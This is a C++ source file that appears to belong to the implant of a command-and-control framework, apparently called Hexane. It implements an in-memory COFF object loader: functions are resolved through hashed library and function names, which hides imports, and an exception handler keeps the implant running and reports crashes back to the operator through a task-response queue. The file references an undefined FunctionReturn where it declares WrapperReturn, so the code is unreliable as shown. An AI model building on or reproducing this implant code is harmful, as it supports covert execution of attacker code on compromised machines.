#include <core/include/objects.hpp>
namespace Objects {

    LPVOID WrapperReturn = nullptr;

    _hash_map wrappers[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = Stream::CreateTaskResponse(TypeExecute);

        exception->ContextRecord->IP_REG = (uint64_t)(U_PTR(FunctionReturn));

        Stream::PackDword(stream, ERROR_UNHANDLED_EXCEPTION);
        Stream::PackDword(stream, exception->ExceptionRecord->ExceptionCode);
        Stream::PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID FunctionWrapper(void *address, void *args, size_t size) {

        void (*function)(char*, uint32_t) = (void(*)(char*, uint32_t)) address;
        WrapperReturn = __builtin_extract_return_addr(__builtin_return_address(0));

        function((char*)args, size);
    }

    BOOL ProcessSymbol(uint8_t* symbol_data, void** function) {

        uint32_t type_hash  = 0;
        uint32_t lib_hash   = 0;
        uint32_t fn_hash    = 0;

        bool success = true;
        *function = nullptr;

        x_memcpy(&type_hash, symbol_data, sizeof(uint32_t));
        x_memcpy(&fn_hash, symbol_data + sizeof(uint32_t), sizeof(uint32_t));

        switch (type_hash){
            case COFF_INCL_HASH: {

                x_memcpy(&lib_hash, symbol_data + (sizeof(uint32_t) * 2), sizeof(uint32_t));
                C_PTR_HASHES(*function, fn_hash, lib_hash);
            }
            case COFF_HEXANE_HASH: {

                for (auto i = 0;; i++) {
                    if (!wrappers[i].name) {
                        break;
                    }

                    if (fn_hash == wrappers[i].name) {
                        *function = wrappers[i].address;
                        success_(true);
                    }
                }
            }
            case COFF_CONTEXT_HASH: {

                *function = Ctx;
                success_(true);
            }
            default: {
                success_(false);
            }
        }

        defer:
        return success;
    }
}
